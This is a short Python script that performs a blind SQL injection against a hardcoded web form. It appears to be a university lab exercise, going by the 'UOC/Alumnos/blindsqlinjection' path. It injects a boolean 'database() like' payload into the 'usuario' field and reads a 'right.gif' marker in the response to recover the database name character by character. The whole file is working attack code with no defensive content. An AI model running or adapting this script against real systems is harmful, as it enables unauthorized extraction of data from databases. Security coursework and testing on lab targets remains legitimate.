from string import printable
from requests import post


len_database_name = 5
database_name = ""
characters = list(printable[::-1])
URL = "http://84.88.58.170/UOC/Alumnos/blindsqlinjection/"
while len(database_name) < len_database_name and characters:
    selected_character = characters.pop()
    isql = (
        "' or (select 1 from dual where database() like '"
        + database_name
        + selected_character
        + "_" * (len_database_name - len(database_name) - 1)
        + "') and '1' = '1"
    )
    response = post(URL, data={"usuario": isql})
    if "right.gif" in response.text:
        database_name += selected_character
        characters = list(printable[::-1])

print(f"database name: {database_name}")
